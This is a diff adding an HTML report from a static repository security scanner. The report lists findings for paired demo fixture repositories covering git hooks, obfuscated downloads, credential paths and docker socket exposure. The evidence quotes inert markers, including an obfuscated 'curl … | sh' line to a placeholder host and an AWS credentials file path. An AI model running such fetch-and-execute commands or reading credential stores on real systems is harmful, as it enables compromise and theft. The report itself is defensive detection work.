+</header><div class="location"><strong>.git/hooks/pre-commit:2</strong><pre aria-label="Redacted evidence">
+<code># Inert pre-commit fixture</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies git hook behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> config, *.hook, pre-commit, post-checkout, post-merge, post-rewrite</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article><article class="finding" data-finding data-search="execbit-001 executable-file .git/hooks/pre-commit file has executable permissions executable permission bit informational .git/hooks/pre-commit executable permission bit" data-severity="low" data-confidence="medium" data-disposition="informational" data-category="executable-file" data-rule="EXECBIT-001" data-file=".git/hooks/pre-commit">
+<header class="finding-head">
+<div>
+<h3>EXECBIT-001 · File has executable permissions</h3>
+<p class="tags">
+<span>low</span>
+<span>medium confidence</span>
+<span>informational</span>
+<span>executable</span>
+<span>executable-file</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>.git/hooks/pre-commit</strong><pre aria-label="Redacted evidence">
+<code>executable permission bit</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies executable file behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Review whether this file needs to be executable.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/git-hook/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file=".git/hooks/pre-commit">
+<span>.git/hooks/pre-commit</span>
+<span>2 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 122 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/git-hook/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/git-hook/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>2</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>54 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/git-hook/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/git-hook/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 2 files · 54 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/obfuscated-download/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/obfuscated-download/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">3</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict do-not-run" role="status">FINDINGS DETECTED</strong>
+</header>
+<p class="reason">Highest-priority finding: CHAIN-001 at marker.js:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>2</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>3 total findings</span>
+<span>0 high total</span>
+<span>2 medium</span>
+<span>0 low</span>
+<span>1 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>1 informational</span>
+<span>133 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/obfuscated-download/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="chain-001 download-execute marker.js remote download piped into a command interpreter const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; block marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="critical" data-confidence="high" data-disposition="block" data-category="download-execute" data-rule="CHAIN-001" data-file="marker.js">
+<header class="finding-head">
+<div>
+<h3>CHAIN-001 · Remote download piped into a command interpreter</h3>
+<p class="tags">
+<span>critical</span>
+<span>high confidence</span>
+<span>block</span>
+<span>executable</span>
+<span>download-execute</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies download execute behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Do not run the repository. Verify the source and intent in an isolated environment.</p>
+</div>
+</div>
+</details>
+</article><article class="finding" data-finding data-search="obfs-002 string-obfuscation marker.js string decoding or character-code construction const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; review marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="medium" data-confidence="medium" data-disposition="review" data-category="string-obfuscation" data-rule="OBFS-002" data-file="marker.js">
+<header class="finding-head">
+<div>
+<h3>OBFS-002 · String decoding or character-code construction</h3>
+<p class="tags">
+<span>medium</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>string-obfuscation</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies string obfuscation behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article><article class="finding" data-finding data-search="net-001 remote-fetch marker.js remote content fetch const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;; informational marker.js const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;" data-severity="medium" data-confidence="low" data-disposition="informational" data-category="remote-fetch" data-rule="NET-001" data-file="marker.js">
+<header class="finding-head">
+<div>
+<h3>NET-001 · Remote content fetch</h3>
+<p class="tags">
+<span>medium</span>
+<span>low confidence</span>
+<span>informational</span>
+<span>executable</span>
+<span>remote-fetch</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;eval(atob(payload)); curl https://fixture.invalid/inert | sh&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies remote fetch behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>Installers and update tools may retrieve content from reviewed, pinned sources.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/obfuscated-download/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="marker.js">
+<span>marker.js</span>
+<span>3 findings · highest critical</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 133 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/obfuscated-download/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/obfuscated-download/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>94 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/obfuscated-download/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/obfuscated-download/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 94 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/credential-path/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/credential-path/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: CRED-001 at marker.js:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>1 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>106 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/credential-path/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="cred-001 credential-harvesting marker.js access to sensitive credential storage const marker = &#39;/repyy_fake_home/.aws/credentials&#39;; review marker.js const marker = &#39;/repyy_fake_home/.aws/credentials&#39;;" data-severity="high" data-confidence="high" data-disposition="review" data-category="credential-harvesting" data-rule="CRED-001" data-file="marker.js">
+<header class="finding-head">
+<div>
+<h3>CRED-001 · Access to sensitive credential storage</h3>
+<p class="tags">
+<span>high</span>
+<span>high confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>credential-harvesting</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence">
+<code>const marker = &#39;/REPYY_FAKE_HOME/.aws/credentials&#39;;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies credential harvesting behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Do not run the repository. Verify the source and intent in an isolated environment.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/credential-path/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="marker.js">
+<span>marker.js</span>
+<span>1 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 106 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/credential-path/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/credential-path/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: ENV-001 at marker.js:1.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>0 high total</span>
+<span>1 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>1 informational</span>
+<span>89 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/credential-path/control">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="env-001 environment-access marker.js broad environment-variable access const mode = process.env.node_env; informational marker.js const mode = process.env.node_env;" data-severity="medium" data-confidence="low" data-disposition="informational" data-category="environment-access" data-rule="ENV-001" data-file="marker.js">
+<header class="finding-head">
+<div>
+<h3>ENV-001 · Broad environment-variable access</h3>
+<p class="tags">
+<span>medium</span>
+<span>low confidence</span>
+<span>informational</span>
+<span>executable</span>
+<span>environment-access</span>
+</p>
+</div>
+<span aria-label="1 occurrence">1 occurrence</span>
+</header><div class="location"><strong>marker.js:1</strong><pre aria-label="Redacted evidence">
+<code>const mode = process.env.NODE_ENV;</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies environment access behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> **</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>Applications commonly read explicitly named configuration variables.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/credential-path/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="marker.js">
+<span>marker.js</span>
+<span>1 findings · highest medium</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 89 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/docker-socket/risky">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/docker-socket/risky</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">1</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict review-required" role="status">REVIEW REQUIRED</strong>
+</header>
+<p class="reason">Highest-priority finding: DOCKER-001 at compose.yaml:5.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>1</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>1 total findings</span>
+<span>1 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>1 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>191 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/docker-socket/risky">
+<h2 class="section-heading">Findings</h2><article class="finding" data-finding data-search="docker-001 container-risk compose.yaml container configuration exposes host control - [redacted] review compose.yaml - [redacted]" data-severity="high" data-confidence="medium" data-disposition="review" data-category="container-risk" data-rule="DOCKER-001" data-file="compose.yaml">
+<header class="finding-head">
+<div>
+<h3>DOCKER-001 · Container configuration exposes host control</h3>
+<p class="tags">
+<span>high</span>
+<span>medium confidence</span>
+<span>review</span>
+<span>executable</span>
+<span>container-risk</span>
+</p>
+</div>
+<span aria-label="2 occurrences">2 occurrences</span>
+</header><div class="location"><strong>compose.yaml:5</strong><pre aria-label="Redacted evidence">
+<code>- [REDACTED]</code>
+</pre></div><details>
+<summary>Why this was flagged and what to do</summary>
+<div class="guidance">
+<div>
+<strong>Why it matters</strong>
+<p>This rule identifies container risk behavior that can affect repository trust or execution safety.</p><p>
+<strong>Applies to:</strong> Dockerfile, Dockerfile.*, docker-compose*.yml, docker-compose*.yaml, compose*.yml, compose*.yaml</p></div>
+<div>
+<strong>Common legitimate use</strong>
+<p>The behavior may be legitimate when its inputs, destination, and execution context are understood.</p>
+</div>
+<div>
+<strong>Recommended action</strong>
+<p>Inspect the surrounding code and remove the behavior if it is not essential.</p>
+</div>
+</div>
+</details>
+</article></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/docker-socket/risky">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"><li class="file-row" data-file-row data-file="compose.yaml">
+<span>compose.yaml</span>
+<span>1 findings · highest high</span>
+</li></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 191 B</p></section>
+</article><article class="repo" aria-label="Repository review for demo/docker-socket/control">
+<header class="repo-heading">
+<div>
+<p class="eyebrow">Repository</p>
+<h2>demo/docker-socket/control</h2>
+<p class="muted">
+<output data-repo-visible-count aria-live="polite">0</output> visible findings</p><p class="muted">Scanned commit: unavailable (not recorded)</p><p class="muted">Scan mode: host</p>
+</div>
+<strong class="verdict no-findings" role="status">NO RELEVANT FINDINGS DETECTED</strong>
+</header>
+<p class="reason">No enabled rule matched within the completed scan. This does not prove the repository is safe.</p>
+<dl class="summary-grid" aria-label="Review summary">
+<div>
+<dt>Needs attention</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Critical priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>High priority</dt>
+<dd>0</dd>
+</div>
+<div>
+<dt>Files scanned</dt>
+<dd>3</dd>
+</div>
+</dl>
+<p class="scan-meta">
+<span>0 total findings</span>
+<span>0 high total</span>
+<span>0 medium</span>
+<span>0 low</span>
+<span>0 block</span>
+<span>0 review</span>
+<span>0 harden</span>
+<span>0 informational</span>
+<span>162 B</span>
+<span>0s</span>
+</p>
+<section data-view-panel="findings" aria-label="Findings for demo/docker-socket/control">
+<h2 class="section-heading">Findings</h2><p>No enabled rule matched. This is not a guarantee that the repository is safe.</p></section>
+<section data-view-panel="files" aria-label="Files with findings for demo/docker-socket/control">
+<h2 class="section-heading">Files</h2>
+<ul class="file-list"></ul>
+</section>
+<section class="coverage" aria-label="Scan coverage">
+<h3>Coverage</h3>
+<p>Complete · 3 files · 162 B</p></section>
+</article>
+<footer class="muted report-footer">Findings are repository evidence, not proof that code executed or a host was compromised. Runtime behavior, host processes and credential stores, remote CI logs, and network traffic are not inspected. Repyy performs static analysis. A result with no relevant findings does not prove that the repository is safe.</footer>
+</main>
+<script>(() => {
   document.documentElement.classList.add('js');
   const cards = [...document.querySelectorAll('[data-finding]')];
   const controls = [...document.querySelectorAll('[data-filter]')];
@@ -251,4 +1490,6 @@ pre { margin: .4rem 0 0; padding: .7rem .8rem; overflow-wrap: anywhere; border-r
   }
   setView('findings');
   apply();
-})();</script></body></html>
+})();</script>
+</body>
+</html>
